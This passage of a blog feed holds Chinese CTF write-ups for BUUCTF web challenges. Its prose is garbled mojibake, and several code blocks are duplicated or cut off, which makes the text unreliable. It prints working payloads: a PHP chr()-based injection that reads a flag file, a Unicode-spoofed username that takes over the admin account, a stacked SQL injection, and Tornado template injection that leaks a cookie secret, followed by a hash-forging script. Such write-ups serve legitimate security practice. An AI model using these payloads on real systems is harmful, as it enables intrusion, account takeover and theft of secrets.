å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚<br>readfile() å‡½æ•°<br>è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br>è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å›<span class="hljs-literal"><code class="language-hljs bash">scandir() å‡½æ•°<br>è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚<br>var_dump()å‡½æ•°ï¼švar_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>var_dump() å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚<br>readfile() å‡½æ•°<br>è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚<br>è¯¥å‡½æ•°è¯»å…¥ä¸€ä¸ªæ–‡ä»¶å¹¶å†™å…¥åˆ°è¾“å‡ºç¼“å†²ã€‚è‹¥æˆåŠŸï¼Œåˆ™è¿”å›ä»æ–‡ä»¶ä¸­è¯»å…¥çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å›<span class="hljs-literal">false</span>ã€‚æ‚¨å¯ä»¥é€šè¿‡ @readfile() å½¢å¼è°ƒç”¨è¯¥å‡½æ•°ï¼Œæ¥éšè—é”™è¯¯ä¿¡æ¯ã€‚<br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>scandir("\")</code>æ¥æ‰«ææ ¹ç›®å½•ï¼Œä½†â€â€è¢«ç¦äº†ï¼Œæ‰€ä»¥è¿™æ ·å­ä¸è¡Œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ\è½¬ä¸ºASCIIç ï¼Œç„¶åå†è½¬ä¸ºå­—ç¬¦ï¼Œ</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">chr()<br>chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚<br>ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼ã€‚å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0ï¼Œè€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0xã€‚<br></code></pre></td></tr></tbody></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ æˆ<code>scandir(chr(47))</code>æ¥æ‰«ææ ¹ç›®å½•<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/3.jpg" alt=""><br>æ‰¾åˆ°äº†flagå­˜æ”¾çš„ç›®å½•<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä»f1aggç›®å½•ä¸­è¯»å–flag<br>æ„é€ payload</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">?num=var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))<br></code></pre></td></tr></tbody></table></figure><p><code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code>å°±æ˜¯/f1agg<br><img src="/LawlietLW.github.io/2019/12/22/buuctf-easy-calc/4.jpg" alt=""><br>flagåˆ°æ‰‹</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> httpèµ°ç§ </tag>
            
            <tag> PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF admin</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-admin/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-admin/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒï¼Œæœ‰æ³¨å†Œå’Œç™»å½•ä¸¤ä¸ªåŠŸèƒ½<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/1.jpg" alt=""></p><a id="more"></a><p>æŸ¥çœ‹æºä»£ç ï¼Œçœ‹åˆ°æç¤º<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/2.jpg" alt=""><br>çŒœæµ‹éœ€è¦ä»¥adminè´¦å·ç™»é™†æ‰èƒ½æ‹¿åˆ°flag<br>é‚£ä¹ˆå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·çœ‹çœ‹(adminè´¦å·å·²è¢«æ³¨å†Œ)<br>æ³¨å†Œè´¦å·åä¸€å…±æœ‰å››ä¸ªé€‰é¡¹<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/3.jpg" alt=""><br>é¦–å…ˆçœ‹åˆ°poståŠŸèƒ½<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/4.jpg" alt=""><br>ä¸€ä¸ªç¼–è¾‘ç•™è¨€çš„åœ°æ–¹ï¼Œå¯èƒ½ä¼šæœ‰xssä¹‹ç±»çš„æ¼æ´ï¼Ÿæˆ‘ä¸å¤ªæ¸…æ¥šï¼Œå› ä¸ºæˆ‘ç›®å‰å¹¶ä¸ä¼šxss<br>å†çœ‹åˆ°change passwordåŠŸèƒ½ï¼ŒæŸ¥çœ‹æºä»£ç <br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/5.jpg" alt=""><br>ç»™å‡ºäº†æºä»£ç çš„GitHubåœ°å€<br>é‚£å°±è¿‡å»çœ‹çœ‹<br>åˆ†æroutes.py<br>è·¯ç”±çš„åŠŸèƒ½ä¸å¤šï¼Œæ³¨å†Œï¼Œç™»å½•ï¼Œç™»å‡ºï¼Œç¼–è¾‘å’Œä¿®æ”¹å¯†ç </p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-meta">@app.route('/register', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/login', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/logout')</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/change', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/edit', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params"><code class="language-hljs python"><span class="hljs-meta">@app.route('/register', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/login', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/logout')</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/change', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">()</span>:</span><br><br><span class="hljs-meta">@app.route('/edit', methods = ['GET', 'POST'])</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">()</span>:</span><br></code></pre></td></tr></tbody></table></figure><p>ä»æ³¨å†Œå¼€å§‹åˆ†æ<br>æ³¨æ„åˆ°æ¥æ”¶usernameè¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ª<code>strlower</code>å‡½æ•°<br>çœ‹èµ·æ¥æ˜¯ä½¿å­—ç¬¦ä¸²å°å†™çš„å‡½æ•°ï¼Œä½†pythonå†…ç½®<code>lower()</code>å‡½æ•°ï¼Œä¸ºä»€ä¹ˆè¦è‡ªå·±å†™ä¸€ä¸ªå‡½æ•°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">()</span>:</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'index'</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">()</span>:</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'index'</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:<br>        name = strlower(form.username.data)<br>        ............<br></code></pre></td></tr></tbody></table></figure><p>äº‹å®ä¸Šï¼Œä¸æ­¢æ³¨å†Œè¿™é‡Œï¼Œç™»å½•å’Œä¿®æ”¹å¯†ç å¤„åŒæ ·ä½¿ç”¨äº†<code>strlower</code>å‡½æ•°</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'index'</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:<br>        name = strlower(form.username.data)<br>        ............<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:<br>        name = strlower(session[<span class="hljs-string"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'index'</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:<br>        name = strlower(form.username.data)<br>        ............<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">'login'</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'POST'</span>:<br>        name = strlower(session[<span class="hljs-string">'name'</span>])<br>        ...........<br></code></pre></td></tr></tbody></table></figure><p>é‚£æˆ‘ä»¬å°±å»çœ‹çœ‹è¿™ä¸ª<code>strlower</code>å‡½æ•°æ˜¯ä»€ä¹ˆæ ·çš„</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword"><code class="language-hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œé¢ä½¿ç”¨äº†nodeprep.prepare()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¯¹åº”çš„åº“æ˜¯twisted<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/7.jpg" alt=""><br>è¿™ä¹ˆä¸€å¯¹æ¯”ï¼Œå‘ç°æºç ä¸­ä½¿ç”¨çš„twistedåº“çš„ç‰ˆæœ¬å®åœ¨å¤ªä½äº†<br><a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/" target="_blank" rel="noopener">å‚è€ƒè¿™ç¯‡æ–‡ç« </a><br>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±èƒ½å½¢æˆä¸€ä¸ªæ”»å‡»é“¾<br>ç™»é™†æ—¶ä¼šè°ƒç”¨ä¸€æ¬¡<code>strlower</code>ï¼Œä¿®æ”¹å¯†ç æ—¶åˆä¼šè°ƒç”¨ä¸€æ¬¡<code>strlower</code>ï¼Œåªè¦æˆ‘ä»¬çš„ç”¨æˆ·åç»è¿‡ä¸¤æ¬¡è°ƒç”¨åå˜æˆäº†adminï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ç„¶åé‡æ–°ç™»é™†äº†</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">á´¬á´°á´¹á´µá´º -> ADMIN -> admin<br></code></pre></td></tr></tbody></table></figure><p>adminçš„Unicodeç¼–ç å¯ä»¥åœ¨ç½‘ä¸Šæ‰¾åˆ°<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-admin/8.jpg" alt=""><br>æˆåŠŸæ‹¿åˆ°flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Unicodeæ¬ºéª— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF EasySQL</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/</url>
      
        <content type="html"><![CDATA[<p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/1.jpg" alt=""></p><a id="more"></a><p>è¿™é¢˜å’Œå¼ºç½‘æ¯éšä¾¿æ³¨ä¸€æ ·ï¼Œéƒ½æ˜¯å †å æ³¨å…¥<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/3.jpg" alt=""><br>é€šè¿‡show tableså¯ä»¥çœ‹åˆ°Flagè¡¨<br>ä½†æƒ³è¦çœ‹åˆ°åˆ—å°±ä¸è¡Œäº†<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-sql/4.jpg" alt=""><br>é€šè¿‡burpfuzzä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°è¿‡æ»¤äº†æŒºå¤šå…³é”®å­—çš„</p><hr><p>æœ‰ç‚¹éš¾é¡¶ï¼Œåªèƒ½çœ‹wpäº†</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql">å®˜æ–¹è§£:1;<span class="hljs-keyword">set</span> sql_mode=pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number"><code class="language-hljs sql">å®˜æ–¹è§£:1;<span class="hljs-keyword">set</span> sql_mode=pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br></code></pre></td></tr></tbody></table></figure><p>è€Œè¿™é“é¢˜çš„sqlè¯­å¥æ˜¯è¿™æ ·çš„</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">select</span> $post[<span class="hljs-string">'query'</span>]||flag <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">select</span> $post[<span class="hljs-string">'query'</span>]||flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></tbody></table></figure><p>æ‹¼æ¥ä¸€ä¸‹å°±å˜æˆäº†è¿™æ ·</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode=pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> ||flag <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode=pipes_as_concat;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> ||flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></tbody></table></figure><p>å…³äº sql_mode :<br>å®ƒå®šä¹‰äº† MySQL åº”æ”¯æŒçš„ SQL è¯­æ³•ï¼Œä»¥åŠåº”è¯¥åœ¨æ•°æ®ä¸Šæ‰§è¡Œä½•ç§ç¡®è®¤æ£€æŸ¥ï¼Œå…¶ä¸­çš„ PIPES_AS_CONCAT å°† || è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œé â€œæˆ–â€ è¿ç®—ç¬¦<br><a href="https://www.cnblogs.com/piperck/p/9835695.html" target="_blank" rel="noopener">MySQL sql_mode è¯´æ˜</a><br>æ‰€ä»¥ï¼Œå½“set sql_mode=pipes_as_concatæ‰§è¡Œåï¼Œä¼šæŠŠselect 1å’Œselect flagçš„ç»“æœæ‹¼æ¥èµ·æ¥<br>è€å®è¯´ï¼Œæˆ‘å®åœ¨æƒ³ä¸å‡ºæ¥è¿™é¢˜çš„sqlè¯­å¥ç«Ÿç„¶æ˜¯è¿™æ ·çš„<br>è¿˜æ˜¯æˆ‘å¤ªèœäº†<br>æ‰€ä»¥æˆ‘æ›´å€¾å‘äºéé¢„æœŸè§£</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">*,1<br></code></pre></td></tr></tbody></table></figure><p>æ‹¼æ¥åˆ°sqlè¯­å¥ä¸­å°±æ˜¯</p><figure class="hljs highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs sql"><span class="hljs-keyword">select</span> *,<span class="hljs-number">1</span>||flag <span class="hljs-keyword"><code class="language-hljs sql"><span class="hljs-keyword">select</span> *,<span class="hljs-number">1</span>||flag <span class="hljs-keyword">from</span> Flag<br></code></pre></td></tr></tbody></table></figure><p>è¿™æ ·å°±æ˜¯é€‰æ‹©æ‰€æœ‰ï¼Œä¸€æ ·èƒ½çˆ†flag</p><p>æ€»çš„æ¥è¯´ï¼Œæ— è®ºæ˜¯å®˜æ–¹è§£è¿˜æ˜¯éé¢„æœŸè§£ï¼Œæˆ‘éƒ½èƒ½ä»ä¸­å­¦åˆ°ä¸€äº›ä¸œè¥¿ï¼Œä¸€ä¸ªæ‰©å®½çŸ¥è¯†é¢ï¼Œä¸€ä¸ªå¼€é˜”æ€è·¯</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å †å æ³¨å…¥ </tag>
            
            <tag> mysql_sql_mode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF easy_tornado</title>
      <link href="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/"/>
      <url>/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/</url>
      
        <content type="html"><![CDATA[<p>æ‰“å¼€ç¯å¢ƒ<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/1.jpg" alt=""></p><a id="more"></a><p>æœ‰ä¸‰ä¸ªé¡µé¢ï¼ŒæŒ¨ä¸ªè®¿é—®çœ‹çœ‹</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">/flag.txt<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/2.jpg" alt=""></p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">/welcome.txt<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/3.jpg" alt=""></p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">/hints.txt<br></code></pre></td></tr></tbody></table></figure><p><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/4.jpg" alt=""><br>å¼€å§‹åˆ†æ<br>ç¬¬ä¸€ä¸ªé¡µé¢å‘Šè¯‰æˆ‘ä»¬flag in /fllllllllllllag<br>hintå‘Šè¯‰æˆ‘ä»¬</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">md5(cookie_secret+md5(filename))<br></code></pre></td></tr></tbody></table></figure><p>ä¹Ÿå°±æ˜¯filenameçš„md5å€¼åŠ ä¸Šcookie_secretå†md5<br>æˆ‘ä»¬æƒ³è¦è¿›å…¥åˆ°fllllllllllllagï¼Œfilenameå·²ç»çŸ¥é“äº†ï¼Œå‰©ä¸‹cookie_secretä¸çŸ¥é“<br>åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå‡ºç°è¿™æ ·ä¸€ä¸ªé¡µé¢</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg=Error<br></code></pre></td></tr></tbody></table></figure><p>é€šè¿‡ç™¾åº¦çŸ¥é“<br>tornadoæ˜¯pythonä¸­çš„ä¸€ä¸ªwebåº”ç”¨æ¡†æ¶<br>renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚<br>å†åŠ ä¸Šerror?msg=Errorè¿™ä¸ªé¡µé¢<br>æ€€ç–‘å­˜åœ¨<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡»(SSTI)</a><br>ç»è¿‡æµ‹è¯•ï¼Œç¡®å®å­˜åœ¨æ¨¡æ¿æ³¨å…¥<br><img src="/LawlietLW.github.io/2019/12/21/buuctf-easy-tornado/5.jpg" alt=""><br>ç„¶åé€šè¿‡æŸ¥é˜…å„ç§èµ„æ–™ï¼Œå‘ç°å¯¹äºtornadoæ¡†æ¶å­˜åœ¨é™„å±æ–‡ä»¶handler.settings<br>(<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a>)<br>payloadä¸º</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><code class="language-hljs bash">http://0bcfd0a4-e28e-441c-be11-1fe0c4b7afa1.node3.buuoj.cn/error?msg={{handler.settings}}<br></code></pre></td></tr></tbody></table></figure><p>å¾—åˆ°cookie_secret</p><figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash"><span class="hljs-string">'cookie_secret'</span>: <span class="hljs-string"><code class="language-hljs bash"><span class="hljs-string">'cookie_secret'</span>: <span class="hljs-string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span>}<br></code></pre></td></tr></tbody></table></figure><p>ç„¶åå†™ä¸€ä¸ªè„šæœ¬å¾—åˆ°æœ€åçš„filehash</p><figure class="hljs highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span><br>    md5=hashlib.md5()<br>    md5.update(str.encode(<span class="hljs-string">'utf8'</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span><br>    filename=<span class="hljs-string">'/fllllllllllllag'</span><br>    cookie_secret=<span class="hljs-string">'c9c4e7d6-252c-47f9-a4d2-c2d67afcd4b7'</span><br>    print(md5(cookie_secret+md5(filename)))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string"><code class="language-hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span><span class="hljs-params">(str)</span>:</span><br>    md5=hashlib.md5()<br>    md5.update(str.encode(<span class="hljs-string">'utf8'</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span><br>    filename=<span 